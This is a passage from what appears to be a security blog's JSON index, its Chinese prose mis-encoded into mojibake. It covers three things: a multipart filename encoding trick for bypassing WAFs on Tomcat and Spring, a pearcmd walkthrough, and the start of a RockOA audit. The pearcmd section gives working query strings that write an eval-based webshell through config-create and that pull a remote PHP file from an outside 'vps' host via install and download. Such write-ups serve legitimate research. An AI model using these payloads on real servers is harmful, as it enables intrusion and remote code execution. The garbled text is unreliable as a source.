-ISO-2022-CN-GB&quot;,&quot;x-iso-8859-11&quot;,&quot;x-JIS0208&quot;,&quot;x-JISAutoDetect&quot;,&quot;x-Johab&quot;,&quot;x-MacArabic&quot;,&quot;x-MacCentralEurope&quot;,&quot;x-MacCroatian&quot;,&quot;x-MacCyrillic&quot;,&quot;x-MacDingbat&quot;,&quot;x-MacGreek&quot;,&quot;x-MacHebrew&quot;,&quot;x-MacIceland&quot;,&quot;x-MacRoman&quot;,&quot;x-MacRomania&quot;,&quot;x-MacSymbol&quot;,&quot;x-MacThai&quot;,&quot;x-MacTurkish&quot;,&quot;x-MacUkraine&quot;,&quot;x-MS932_0213&quot;,&quot;x-MS950-HKSCS&quot;,&quot;x-MS950-HKSCS-XP&quot;,&quot;x-mswin-936&quot;,&quot;x-PCK&quot;,&quot;x-SJIS_0213&quot;,&quot;x-UTF-16LE-BOM&quot;,&quot;X-UTF-32BE-BOM&quot;,&quot;X-UTF-32LE-BOM&quot;,&quot;x-windows-50220&quot;,&quot;x-windows-50221&quot;,&quot;x-windows-874&quot;,&quot;x-windows-949&quot;,&quot;x-windows-950&quot;,&quot;x-windows-iso2022jp&quot;&#125; è¿™é‡Œä½œä¸ºæ¼”ç¤ºæˆ‘å°±éšä¾¿é€‰ä¸€ä¸ªäº†UTF-16BE åŒæ ·çš„æˆ‘ä»¬ä¹Ÿå¯ä»¥è¿›è¡Œå¥—å¨ƒç»“åˆä¸Šé¢çš„filename=&quot;&quot;y\\4.\\w\\arK&quot;æ”¹æˆfilename=&quot;UTF-16BE&#39;Y4tacker&#39;%00%22%00y%00%5C%004%00.%00%5C%00w%00%5C%00a%00r%00K&quot; æ¥ä¸‹æ¥å¤„ç†ç‚¹å°åŠ å¼ºï¼Œå¯ä»¥çœ‹åˆ°åœ¨è¿™é‡Œåˆ†éš”ç¬¦æ— é™åŠ ï¼Œè€Œä¸”åŠ äº†ğŸŒŸå·çš„å­—ç¬¦ä¹‹åä¹Ÿä¼šå»é™¤ä¸€ä¸ªğŸŒŸå· å› æ­¤æˆ‘ä»¬æœ€ç»ˆå¯ä»¥å¾—åˆ°å¦‚ä¸‹payloadï¼Œæ­¤æ—¶ä»…ä»…åŸºäºæ­£åˆ™çš„wafè§„åˆ™å°±å¾ˆæœ‰å¯èƒ½ä¼šå¤±æ•ˆ 1234567------WebKitFormBoundaryQKTY1MomsixvN8vXContent-Disposition: form-data*;;;;;;;;;;name*=&quot;UTF-16BE&#x27;Y4tacker&#x27;%00d%00e%00p%00l%00o%00y%00W%00a%00r&quot;;;;;;;;;filename*=&quot;UTF-16BE&#x27;Y4tacker&#x27;%00%22%00y%00%5C%004%00.%00%5C%00w%00%5C%00a%00r%00K&quot;Content-Type: application/octet-stream123------WebKitFormBoundaryQKTY1MomsixvN8vX-- å¯ä»¥çœ‹è§æˆåŠŸä¸Šä¼  å˜å½¢ æ›´æ–°2022-06-20è¿™é‡Œæµ‹è¯•ç‰ˆæœ¬æ˜¯Tomcat8.5.72ï¼Œè¿™é‡Œä¹Ÿä¸æƒ³å†æµ‹å…¶ä»–ç‰ˆæœ¬å·®å¼‚äº†åªæ˜¯æä¾›ä¸€ç§æ€è·¯ åœ¨æ­¤åŸºç¡€ä¸Šæˆ‘å‘ç°è¿˜å¯ä»¥åšä¸€äº›æ–°çš„ä¸œè¥¿ï¼Œå…¶å®å°±æ˜¯å¯¹org.apache.tomcat.util.http.fileupload.ParameterParser#parse(char[], int, int, char)å‡½æ•°è¿›è¡Œæ·±å…¥åˆ†æ åœ¨è·å–å€¼çš„æ—¶å€™paramValue = parseQuotedToken(new char[] &#123;separator &#125;);ï¼Œå…¶å®æ˜¯æŒ‰ç…§åˆ†éš”ç¬¦;åˆ†å‰²ï¼Œå› æ­¤æˆ‘ä»¬ä¸éš¾æƒ³åˆ°å‰é¢çš„ä¸œè¥¿å…¶å®å¯ä»¥ä¸ç”¨&quot;è¿›è¡ŒåŒ…è£¹ï¼Œåœ¨parseQuotedTokenæœ€åè¿”å›è°ƒç”¨çš„æ˜¯return getToken(true);ï¼Œè¿™ä¸ªå‡½æ•°ä¹Ÿå¾ˆç®€å•å°±ä¸å¿…å¤šè§£é‡Š 1234567891011121314151617181920212223private String getToken(final boolean quoted) &#123; // Trim leading white spaces while ((i1 &lt; i2) &amp;&amp; (Character.isWhitespace(chars[i1]))) &#123; i1++; &#125; // Trim trailing white spaces while ((i2 &gt; i1) &amp;&amp; (Character.isWhitespace(chars[i2 - 1]))) &#123; i2--; &#125; // Strip away quotation marks if necessary if (quoted &amp;&amp; ((i2 - i1) &gt;= 2) &amp;&amp; (chars[i1] == &#x27;&quot;&#x27;) &amp;&amp; (chars[i2 - 1] == &#x27;&quot;&#x27;)) &#123; i1++; i2--; &#125; String result = null; if (i2 &gt; i1) &#123; result = new String(chars, i1, i2 - i1); &#125; return result; &#125; å¯ä»¥çœ‹åˆ°è¿™é‡Œä¹Ÿæ˜¯æˆåŠŸè¯†åˆ«çš„ æ—¢ç„¶è°ƒç”¨parseè§£æå‚æ•°æ—¶å¯ä»¥ä¸è¢«åŒ…è£¹ï¼Œç»“åˆgetTokenå‡½æ•°æˆ‘ä»¬å¯ä»¥çŸ¥é“åœ¨æœ€åä¸€ä¸ªå‚æ•°å…¶å®å°±ä¸å¿…è¦åŠ ;äº†ï¼Œå¹¶ä¸”è§£æå®Œé€šè¿‡params.get(&quot;filename&quot;)è·å–åˆ°å‚æ•°åè¿˜ä¼šè°ƒç”¨åˆ°org.apache.tomcat.util.http.parser.HttpParser#unquoteé‚£ä¹Ÿå¯ä»¥åŸºäºæ­¤å†æ¬¡å˜å½¢ ä¸ºäº†ç›´è§‚è¿™é‡Œå°±ç›´æ¥æ˜æ–‡äº†ï¼Œæ˜¯ä¸æ˜¯ä¹Ÿå¾ˆç¥å¥‡ æ‰©å¤§åˆ©ç”¨é¢ç°åœ¨åªæ˜¯waråŒ…çš„åœºæ™¯ï¼Œå¤šå¤šå°‘å°‘å½±å“æ€§è¢«é™ä½ï¼Œä½†æˆ‘ä»¬è¿™ä¸²ä»£ç å…¶å®æŠ½è±¡å‡ºæ¥å°±ä¸€ä¸ªå…³é”® 12Part warPart = request.getPart(&quot;deployWar&quot;);String filename = warPart.getSubmittedFileName(); é€šè¿‡æŸ¥è¯¢å®˜æ–¹æ–‡æ¡£ï¼Œå¯ä»¥å‘ç°ä»Servlet3.1å¼€å§‹ï¼Œtomcatæ–°å¢äº†å¯¹æ­¤çš„æ”¯æŒï¼Œä¹Ÿå°±æ„å‘³ç€ç®€å•é€šè¿‡javax.servlet.http.HttpServletRequest#getPartså³å¯ï¼Œç®€åŒ–äº†æˆ‘ä»¬æ–‡ä»¶ä¸Šä¼ çš„ä»£ç è´Ÿæ‹…(å¦‚æœæˆ‘æ˜¯å¼€å‘äººå‘˜ï¼Œæˆ‘è‚¯å®šé¦–é€‰ä¹Ÿä¼šä½¿ç”¨ï¼Œè°ä¸æƒ³å½“æ‡’ç‹—å‘¢) 1234567getSubmittedFileNameString getSubmittedFileName()Gets the file name specified by the clientReturns:the submitted file nameSince:Servlet 3.1 æ›´æ–°Spring 2022-06-20æ—©ä¸Šèµ·åºŠæƒ³ç€æ˜¨æ™šå’Œé™ˆå¸ˆçš„ç¢°æ’ï¼Œèµ·åºŠååˆçœ‹äº†ä¸‹é™ˆå¸ˆçš„æ˜Ÿçƒï¼Œçœ‹åˆ°è¿™ä¸ªä¸å¦¨å†è¯•è¯•Springæ˜¯å¦ä¹ŸæŒ‰ç…§äº†RFCçš„å®ç°å‘¢ï¼ˆæ¯•ç«ŸSpringå†…ç½®äº†Tomcatï¼Œå¯èƒ½ä¼šæœ‰ç±»ä¼¼çš„å‘¢ï¼‰ Springä¸ºæˆ‘ä»¬æä¾›äº†å¤„ç†æ–‡ä»¶ä¸Šä¼ MultipartFileçš„æ¥å£ 1234567891011121314151617181920public interface MultipartFile extends InputStreamSource &#123; String getName(); //è·å–å‚æ•°å @Nullable String getOriginalFilename();//åŸå§‹çš„æ–‡ä»¶å @Nullable String getContentType();//å†…å®¹ç±»å‹ boolean isEmpty(); long getSize(); //å¤§å° byte[] getBytes() throws IOException;// è·å–å­—èŠ‚æ•°ç»„ InputStream getInputStream() throws IOException;//ä»¥æµæ–¹å¼è¿›è¡Œè¯»å– default Resource getResource() &#123; return new MultipartFileResource(this); &#125; // å°†ä¸Šä¼ çš„æ–‡ä»¶å†™å…¥æ–‡ä»¶ç³»ç»Ÿ void transferTo(File var1) throws IOException, IllegalStateException; // å†™å…¥æŒ‡å®špath default void transferTo(Path dest) throws IOException, IllegalStateException &#123; FileCopyUtils.copy(this.getInputStream(), Files.newOutputStream(dest)); &#125;&#125; è€Œspringå¤„ç†æ–‡ä»¶ä¸Šä¼ é€»è¾‘çš„å…·ä½“å…³é”®é€»è¾‘åœ¨org.springframework.web.multipart.support.StandardMultipartHttpServletRequest#parseRequestï¼ŒæŠ„ä¸ªæ–‡ä»¶ä¸Šä¼ demoæ¥è¿›è¡Œæµ‹è¯•åˆ†æ Spring4è¿™é‡Œæˆ‘æµ‹è¯•äº†springboot1.5.20.RELEASEå†…ç½®Spring4.3.23ï¼Œå…·ä½“å°ç‰ˆæœ¬ä¹‹é—´æ˜¯å¦æœ‰å·®å¼‚è¿™é‡Œå°±ä¸å†æ¢ç©¶ å…¶ä¸­å…³äºorg.springframework.web.multipart.support.StandardMultipartHttpServletRequest#parseRequestçš„è°ƒç”¨ä¹Ÿæœ‰äº›ä¸åŒ 123456789101112131415161718192021222324252627private void parseRequest(HttpServletRequest request) &#123; try &#123; Collection&lt;Part&gt; parts = request.getParts(); this.multipartParameterNames = new LinkedHashSet(parts.size()); MultiValueMap&lt;String, MultipartFile&gt; files = new LinkedMultiValueMap(parts.size()); Iterator var4 = parts.iterator(); while(var4.hasNext()) &#123; Part part = (Part)var4.next(); String disposition = part.getHeader(&quot;content-disposition&quot;); String filename = this.extractFilename(disposition); if (filename == null) &#123; filename = this.extractFilenameWithCharset(disposition); &#125; if (filename != null) &#123; files.add(part.getName(), new StandardMultipartHttpServletRequest.StandardMultipartFile(part, filename)); &#125; else &#123; this.multipartParameterNames.add(part.getName()); &#125; &#125; this.setMultipartFiles(files); &#125; catch (Throwable var8) &#123; throw new MultipartException(&quot;Could not parse multipart servlet request&quot;, var8); &#125;&#125; ç®€å•çœ‹äº†ä¸‹å’Œtomcatä¹‹å‰çš„åˆ†æå¾ˆåƒï¼Œè¿™é‡ŒSpring4å½“ä¸­åŒæ—¶ä¹Ÿæ˜¯æ”¯æŒfilename*æ ¼å¼çš„ çœ‹çœ‹å…·ä½“é€»è¾‘ 1234567891011121314151617181920212223242526272829private String extractFilename(String contentDisposition, String key) &#123; if (contentDisposition == null) &#123; return null; &#125; else &#123; int startIndex = contentDisposition.indexOf(key); if (startIndex == -1) &#123; return null; &#125; else &#123; //æˆªå–filename=åé¢çš„å†…å®¹ String filename = contentDisposition.substring(startIndex + key.length()); int endIndex; //å¦‚æœåé¢å¼€å¤´æ˜¯â€œåˆ™æˆªå–â€â€œä¹‹é—´çš„å†…å®¹ if (filename.startsWith(&quot;\\&quot;&quot;)) &#123; endIndex = filename.indexOf(&quot;\\&quot;&quot;, 1); if (endIndex != -1) &#123; return filename.substring(1, endIndex); &#125; &#125; else &#123; //å¯ä»¥çœ‹åˆ°å¦‚æœæ²¡æœ‰â€œâ€åŒ…è£¹å…¶å®ä¹Ÿå¯ä»¥ï¼Œè¿™å’Œå½“æ—¶é™ˆå¸ˆåˆ†äº«çš„å…¶ä¸­ä¸€ä¸ªtrickæ˜¯ç¬¦åˆçš„ endIndex = filename.indexOf(&quot;;&quot;); if (endIndex != -1) &#123; return filename.substring(0, endIndex); &#125; &#125; return filename; &#125; &#125; &#125; ç®€å•æµ‹è¯•ä¸€æ³¢ï¼Œä¸å¿ƒä¸­ç»“æœä¸€è‡´ åŒæ—¶ç”±äºindexofé»˜è®¤å–ç¬¬ä¸€ä½ï¼Œå› æ­¤æˆ‘ä»¬è¿˜å¯ä»¥åŠ ä¸€äº›å¹²æ‰°å­—ç¬¦å°è¯•çªç ´wafé€»è¾‘ å¦‚æœfilename*å¼€å¤´ä½†æ˜¯spring4å½“ä¸­æ²¡æœ‰å…³äºurlè§£ç çš„éƒ¨åˆ† æ²¡æœ‰è¿™éƒ¨åˆ†ä¼šå‡ºç°ä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ä»¬åªèƒ½è‡ªå·±å‘åŒ…å‰è§£ç ï¼Œè¿™æ ·çš„è¯å¦‚æœå‡ºç°00å­—èŠ‚å°±ä¼šæŠ¥é”™ï¼ŒæŠ¥é”™å çœ‹èµ·æ¥æ˜¯springæ¡†æ¶è§£æheaderçš„åŸå› ï¼Œä½†æ˜¯è¿™é‡ŒæŠ¥é”™ä¿¡æ¯ä¹Ÿå¾ˆæœ‰è¶£å°†é¡¹ç›®åœ°å€çš„ç»å¯¹è·¯å¾„æŠ›å‡ºäº†ï¼Œæ„Ÿè§‰ä¸å¤±ä¸ºä¿¡æ¯æ”¶é›†çš„ä¸€ç§æ–¹å¼ Spring5ä¹Ÿæ˜¯éšä¾¿æ¥ä¸ªæ–°çš„springboot2.6.4çš„ï¼Œæ¥çœ‹çœ‹spring5çš„ï¼Œå°ç‰ˆæœ¬é—´å·®å¼‚ä¸æµ‹äº†ï¼Œç»è¿‡æµ‹è¯•å‘ç°spring5å’Œspring4ä¹‹é—´ä¹Ÿæ˜¯æœ‰ç‰ˆæœ¬å·®å¼‚å¤„ç†ä¹Ÿæœ‰äº›ä¸åŒï¼ŒåŒæ ·æ˜¯åœ¨parseRequest 1234567891011121314151617181920212223242526272829private void parseRequest(HttpServletRequest request) &#123; try &#123; Collection&lt;Part&gt; parts = request.getParts(); this.multipartParameterNames = new LinkedHashSet(parts.size()); MultiValueMap&lt;String, MultipartFile&gt; files = new LinkedMultiValueMap(parts.size()); Iterator var4 = parts.iterator(); while(var4.hasNext()) &#123; Part part = (Part)var4.next(); String headerValue = part.getHeader(&quot;Content-Disposition&quot;); ContentDisposition disposition = ContentDisposition.parse(headerValue); String filename = disposition.getFilename(); if (filename != null) &#123; if (filename.startsWith(&quot;=?&quot;) &amp;&amp; filename.endsWith(&quot;?=&quot;)) &#123; filename = StandardMultipartHttpServletRequest.MimeDelegate.decode(filename); &#125; files.add(part.getName(), new StandardMultipartHttpServletRequest.StandardMultipartFile(part, filename)); &#125; else &#123; this.multipartParameterNames.add(part.getName()); &#125; &#125; this.setMultipartFiles(files); &#125; catch (Throwable var9) &#123; this.handleParseFailure(var9); &#125; &#125; å¾ˆæ˜æ˜¾å¯ä»¥çœ‹åˆ°è¿™ä¸€è¡Œfilename.startsWith(&quot;=?&quot;) &amp;&amp; filename.endsWith(&quot;?=&quot;)ï¼Œå¯ä»¥çœ‹å‡ºSpringå¯¹æ–‡ä»¶åä¹Ÿæ˜¯æ”¯æŒQPç¼–ç  åœ¨ä¸Šé¢èƒ½çœ‹åˆ°è¿˜è°ƒç”¨äº†ä¸€ä¸ªè§£æçš„æ–¹æ³•org.springframework.http.ContentDisposition#parse ï¼Œå¤šåŠå°±æ˜¯è¿™é‡Œäº†,é‚£ä¹ˆç»§ç»­æ·±å…¥ä¸‹ å¯ä»¥çœ‹åˆ°ä¸€æ–¹é¢æ˜¯QPç¼–ç ï¼Œå¦ä¸€æ–¹é¢ä¹Ÿæ˜¯æ”¯æŒfilename*,åŒæ ·è·å–å€¼æ˜¯æˆªå–&quot;ä¹‹é—´çš„æˆ–è€…æ²¡æ‰¾åˆ°å°±ç›´æ¥æˆªå–=åé¢çš„éƒ¨åˆ† å¦‚æœæ˜¯filename*åé¢çš„å¤„ç†é€»è¾‘å°±æ˜¯elseåˆ†ä¹‹ï¼Œå¯ä»¥çœ‹å‡ºå’Œæˆ‘ä»¬ä¸Šé¢åˆ†æspring4è¿˜æ˜¯æœ‰ç‚¹åŒºåˆ«å°±æ˜¯è¿™é‡Œåªæ”¯æŒUTF-8/ISO-8859-1/US_ASCIIï¼Œç¼–ç å—é™åˆ¶ 123456789int idx1 = value.indexOf(39);int idx2 = value.indexOf(39, idx1 + 1);if (idx1 != -1 &amp;&amp; idx2 != -1) &#123; charset = Charset.forName(value.substring(0, idx1).trim()); Assert.isTrue(StandardCharsets.UTF_8.equals(charset) || StandardCharsets.ISO_8859_1.equals(charset), &quot;Charset should be UTF-8 or ISO-8859-1&quot;); filename = decodeFilename(value.substring(idx2 + 1), charset);&#125; else &#123; filename = decodeFilename(value, StandardCharsets.US_ASCII);&#125; ä½†å…¶å®ä»”ç»†æƒ³è¿™ä¸ªç»“æœæ˜¯ç¬¦åˆRFCæ–‡æ¡£è¦æ±‚çš„ æ¥ç€æˆ‘ä»¬ç»§ç»­åé¢ä¼šç»§ç»­æ‰§è¡ŒdecodeFilename ä»£ç é€»è¾‘å¾ˆæ¸…æ™°å­—ç¬¦ä¸²çš„è§£ç ,å¦‚æœå­—ç¬¦ä¸²æ˜¯å¦åœ¨RFC 5987æ–‡æ¡£è§„å®šçš„Headerå­—ç¬¦å°±ç›´æ¥è°ƒç”¨baos.writeå†™å…¥ 1234attr-char = ALPHA / DIGIT / &quot;!&quot; / &quot;#&quot; / &quot;$&quot; / &quot;&amp;&quot; / &quot;+&quot; / &quot;-&quot; / &quot;.&quot; / &quot;^&quot; / &quot;_&quot; / &quot;`&quot; / &quot;|&quot; / &quot;~&quot; ; token except ( &quot;*&quot; / &quot;&#x27;&quot; / &quot;%&quot; ) å¦‚æœä¸åœ¨è¦æ±‚è¿™ä¸€ä½å¿…é¡»æ˜¯%ç„¶å16è¿›åˆ¶è§£ç åä¸¤ä½ï¼Œå…¶å®å°±æ˜¯urlè§£ç ï¼Œç®€å•æµ‹è¯•å³å¯ å‚è€ƒæ–‡ç« https://www.ch1ng.com/blog/264.html https://datatracker.ietf.org/doc/html/rfc6266#section-4.3 https://datatracker.ietf.org/doc/html/rfc2231 https://datatracker.ietf.org/doc/html/rfc5987#section-3.2.1 https://y4tacker.github.io/2022/02/25/year/2022/2/Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%A7%E6%9D%80%E5%99%A8-%E7%BB%95waf(%E9%92%88%E5%AF%B9commons-fileupload%E7%BB%84%E4%BB%B6)/ https://docs.oracle.com/javaee/7/api/javax/servlet/http/Part.html#getSubmittedFileName-- http://t.zoukankan.com/summerday152-p-13969452.html#%E4%BA%8C%E3%80%81%E5%A4%84%E7%90%86%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6multipartfile%E6%8E%A5%E5%8F%A3","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Waf","slug":"Waf","permalink":"https://y4tacker.github.io/tags/Waf/"}]},{"title":"å…³äºpearcmdåˆ©ç”¨æ€»ç»“","slug":"year/2022/6/å…³äºpearcmdåˆ©ç”¨æ€»ç»“","date":"2022-06-19T01:08:07.000Z","updated":"2024-08-04T09:01:49.499Z","comments":true,"path":"2022/06/19/year/2022/6/å…³äºpearcmdåˆ©ç”¨æ€»ç»“/","link":"","permalink":"https://y4tacker.github.io/2022/06/19/year/2022/6/%E5%85%B3%E4%BA%8Epearcmd%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/","excerpt":"","text":"ç¯å¢ƒæ¡ä»¶æœ‰ä¸¤ä¸ªæ¡ä»¶ peclæ˜¯PHPä¸­ç”¨äºç®¡ç†æ‰©å±•è€Œä½¿ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œè€Œpearæ˜¯peclä¾èµ–çš„ç±»åº“ã€‚åœ¨7.3åŠä»¥å‰ï¼Œpecl/pearæ˜¯é»˜è®¤å®‰è£…çš„ï¼›åœ¨7.4åŠä»¥åï¼Œéœ€è¦æˆ‘ä»¬åœ¨ç¼–è¯‘PHPçš„æ—¶å€™æŒ‡å®š--with-pearæ‰ä¼šå®‰è£…ã€‚ ä¸è¿‡ï¼Œåœ¨Dockerä»»æ„ç‰ˆæœ¬é•œåƒä¸­ï¼Œpcel/pearéƒ½ä¼šè¢«é»˜è®¤å®‰è£…ï¼Œå®‰è£…çš„è·¯å¾„åœ¨/usr/local/lib/php å¹¶ä¸”php.iniå½“ä¸­ register_argc_argv=Onéœ€è¦å¼€å¯ å‡†å¤‡12&lt;?phpinclude($_GET[&#x27;file&#x27;]); pearä¼šåœ¨pearcmd.phpè·å–å‘½ä»¤è¡Œå‚æ•° 123456789PEAR_Command::setFrontendType(&#x27;CLI&#x27;);$all_commands = PEAR_Command::getCommands();$argv = Console_Getopt::readPHPArgv();// fix CGI sapi oddity - the -- in pear.bat/pear is not removedif (php_sapi_name() != &#x27;cli&#x27; &amp;&amp; isset($argv[1]) &amp;&amp; $argv[1] == &#x27;--&#x27;) &#123; unset($argv[1]); $argv = array_values($argv);&#125; è€Œpearè·å–å‘½ä»¤è¡Œå‚æ•°åœ¨readPHPArgv()ä¸­ 123456789101112131415public static function readPHPArgv() &#123; global $argv; if (!is_array($argv)) &#123; if (!@is_array($_SERVER[&#x27;argv&#x27;])) &#123; if (!@is_array($GLOBALS[&#x27;HTTP_SERVER_VARS&#x27;][&#x27;argv&#x27;])) &#123; $msg = &quot;Could not read cmd args (register_argc_argv=Off?)&quot;; return PEAR::raiseError(&quot;Console_Getopt: &quot; . $msg); &#125; return $GLOBALS[&#x27;HTTP_SERVER_VARS&#x27;][&#x27;argv&#x27;]; &#125; return $_SERVER[&#x27;argv&#x27;]; &#125; return $argv; &#125; è¿™é‡Œä¼šå…ˆå°è¯•$argvï¼Œå¦‚æœä¸å­˜åœ¨å†å°è¯•$_SERVER[&#39;argv&#39;]ï¼Œåè€…æˆ‘ä»¬å¯é€šè¿‡query-stringæ§åˆ¶ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬é€šè¿‡Webè®¿é—®äº†pearå‘½ä»¤è¡Œçš„åŠŸèƒ½ï¼Œä¸”èƒ½å¤Ÿæ§åˆ¶å‘½ä»¤è¡Œçš„å‚æ•° åˆ©ç”¨å¯ä»¥çœ‹åˆ°å‚æ•°æœ‰è¿™ä¹ˆå¤š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748Commands:build Build an Extension From C Sourcebundle Unpacks a Pecl Packagechannel-add Add a Channelchannel-alias Specify an alias to a channel namechannel-delete Remove a Channel From the Listchannel-discover Initialize a Channel from its serverchannel-info Retrieve Information on a Channelchannel-login Connects and authenticates to remote channel serverchannel-logout Logs out from the remote channel serverchannel-update Update an Existing Channelclear-cache Clear Web Services Cacheconfig-create Create a Default configuration fileconfig-get Show One Settingconfig-help Show Information About Settingconfig-set Change Settingconfig-show Show All Settingsconvert Convert a package.xml 1.0 to package.xml 2.0 formatcvsdiff Run a &quot;cvs diff&quot; for all files in a packagecvstag Set CVS Release Tagdownload Download Packagedownload-all Downloads each available package from the default channelinfo Display information about a packageinstall Install Packagelist List Installed Packages In The Default Channellist-all List All Packageslist-channels List Available Channelslist-files List Files In Installed Packagelist-upgrades List Available Upgradeslogin Connects and authenticates to remote server [Deprecated in favor of channel-login]logout Logs out from the remote server [Deprecated in favor of channel-logout]makerpm Builds an RPM spec file from a PEAR packagepackage Build Packagepackage-dependencies Show package dependenciespackage-validate Validate Package Consistencypickle Build PECL Packageremote-info Information About Remote Packagesremote-list List Remote Packagesrun-scripts Run Post-Install Scripts bundled with a packagerun-tests Run Regression Testssearch Search remote package databaseshell-test Shell Script Testsign Sign a package distribution filesvntag Set SVN Release Taguninstall Un-install Packageupdate-channels Update the Channel Listupgrade Upgrade Packageupgrade-all Upgrade All Packages [Deprecated in favor of calling upgrade with no parameters] å¯ä»¥çœ‹è§è¿™é‡Œé¢æœ‰ä¸‰ä¸ªå¯èƒ½åˆ©ç”¨çš„å‚æ•°ï¼Œä¸€ä¸ªæ˜¯pç‰›æ–‡ä¸­æåˆ°çš„config-createï¼Œä¸€ä¸ªinstallè¿˜æœ‰ç”¨è¿‡download config-createå¤šåŠ ä¸€ä¸ªdieï¼Œé˜²æ­¢å¤šä¸ªè¾“å‡º 1/?file=/www/server/php/52/lib/php/pearcmd.php&amp;+config-create+/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);die()?&gt;+/tmp/test.php install1/?file=/www/server/php/52/lib/php/peclcmd.php&amp;+install+http://vps/1.php æ–‡ä»¶å°±ä¼šè¢«ä¸‹è½½åˆ°/tmp/pear/download/1.phpï¼Œå›æ˜¾èƒ½çœ‹åˆ° downloadä¸ªäººè§‰å¾—è¿™ä¸ªæ¯”ä¸Šé¢installèˆ’æœç‚¹ï¼Œè¿™ä¸ªç›´æ¥ä¸‹è½½åˆ°webç›®å½•äº†ï¼Œä¸ç”¨æå‰çŸ¥é“webç›®å½•å…·ä½“è·¯å¾„ 1/?file=/www/server/php/52/lib/php/peclcmd.php&amp;+download+http://vps/1.php é—²è¯å¦‚æœpearcmdå…³é”®è¯è¢«banæ€ä¹ˆåŠï¼Œå…¶å®å¯ä»¥ç”¨peclcmd.phpä½œä¸ºå¹³æ›¿ï¼Œåœ¨è¿™ä¸ªphpæ–‡ä»¶å½“ä¸­å…¶å®å°±æ˜¯å¼•å…¥äº†pearcmd.php 123456789if (&#x27;/www/server/php/52/lib/php&#x27; != &#x27;@&#x27;.&#x27;include_path&#x27;.&#x27;@&#x27;) &#123; ini_set(&#x27;include_path&#x27;, &#x27;/www/server/php/52/lib/php&#x27;); $raw = false;&#125; else &#123; // this is a raw, uninstalled pear, either a cvs checkout, or php distro $raw = true;&#125;define(&#x27;PEAR_RUNTYPE&#x27;, &#x27;pecl&#x27;);require_once &#x27;pearcmd.php&#x27;; å‚è€ƒæ–‡ç« https://tttang.com/archive/1312/","categories":[{"name":"php","slug":"php","permalink":"https://y4tacker.github.io/categories/php/"}],"tags":[{"name":"pearcmd","slug":"pearcmd","permalink":"https://y4tacker.github.io/tags/pearcmd/"}]},{"title":"Y4æ•™ä½ å®¡è®¡ç³»åˆ—ä¹‹RockOA","slug":"year/2022/6/Y4æ•™ä½ å®¡è®¡ç³»åˆ—ä¹‹RockOA","date":"2022-06-16T08:42:37.000Z","updated":"2024-08-04T09:01:49.445Z","comments":true,"path":"2022/06/16/year/2022/6/Y4æ•™ä½ å®¡è®¡ç³»åˆ—ä¹‹RockOA/","link":"","permalink":"https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8BRockOA/","excerpt":"","text":"Y4æ•™ä½ å®¡è®¡ç³»åˆ—ä¹‹RockOAå†™åœ¨å‰é¢ä¸çŸ¥é“æ˜¯å•¥ç‰ˆæœ¬æ— è¯­å­ï¼Œåæ­£è€å¸ˆç»™çš„ç®€å•å®¡ä¸€ä¸‹ï¼Œé¡ºä¾¿åæ§½ä¸€å¥è€å¸ˆè¿ç»­ä¸¤å¤©åªæ•™ç”¨å·¥å…·åˆ°å¤„ä¹±æ‰«ç´¯ æ”¾äº†ä¸ªå¤‡ä»½åœ¨https://github.com/Y4tacker/CTFBackup/blob/main/oa/rockoa/rockoa.zip æ¶æ„ä¸åŒäºå…¶ä»–è¿™ä¸ªé»˜è®¤é¦–é¡µä¸Šrock.phpï¼Œä¹Ÿæ˜¯ç®€å•çš„è‡ªå·±å»å®ç°äº†MVCï¼Œæˆ‘ä»¬å…ˆçœ‹çœ‹rock.php å¯ä»¥çœ‹åˆ°ï¼Œé¦–å…ˆæ˜¯å®šä¹‰äº†é¡¹ç›®çš„PROJECTå˜é‡ï¼Œæ¥ä¸‹æ¥åˆ¤æ–­æ˜¯å¦å®‰è£…ä»¥åŠå¦‚æœæ²¡æœ‰ç™»é™†åˆ™è·³è½¬åˆ°ç™»é™†é¡µ 12345678910111213141516171819202122232425&lt;?php define(&#x27;PROJECT&#x27;, &#x27;webrock&#x27;);include_once(&#x27;config/config.php&#x27;);$islogin = (int)$rock-&gt;session(QOM.&#x27;adminid&#x27;,0);$m = &#x27;index&#x27;;$p = PROJECT;$d = &#x27;&#x27;;$a = &#x27;default&#x27;;$ajaxbool = $rock-&gt;get(&#x27;ajaxbool&#x27;,&#x27;false&#x27;);$mode = $rock-&gt;get(&#x27;m&#x27;, $m);$dir = $rock-&gt;get(&#x27;d&#x27;, $d);if(!$config[&#x27;install&#x27;] &amp;&amp; $mode != &#x27;install&#x27;)$rock-&gt;location(&#x27;?m=install&#x27;);//å·²å¯ä»¥æ­£å¸¸ç™»å½•ï¼Œè¿™å¥å¯åˆ é™¤if($mode==&#x27;login&#x27; || $dir==&#x27;taskrun&#x27; || $mode==&#x27;taskrun&#x27; || $mode==&#x27;install&#x27;)$islogin = 1;//ä¸å¯åˆ é™¤if($islogin == 0)&#123; if($ajaxbool == &#x27;true&#x27;)&#123; echo &#x27;sorry! not sign&#x27;; &#125;else&#123; $rock-&gt;location(&#x27;?m=login&#x27;); &#125; exit();&#125;include_once(&#x27;include/View.php&#x27;); æ¥ä¸‹æ¥æ‰æ˜¯é‡ç‚¹include_once(&#39;include/View.php&#39;);ï¼Œè¿™é‡Œçœ‹è§æœ‰ä¸‰ä¸ªé‡è¦çš„å‚æ•°ï¼Œä¸€ä¸ªdå†³å®šé¡¹ç›®è·¯å¾„ä¹Ÿå°±æ˜¯å¯¹åº”webæ 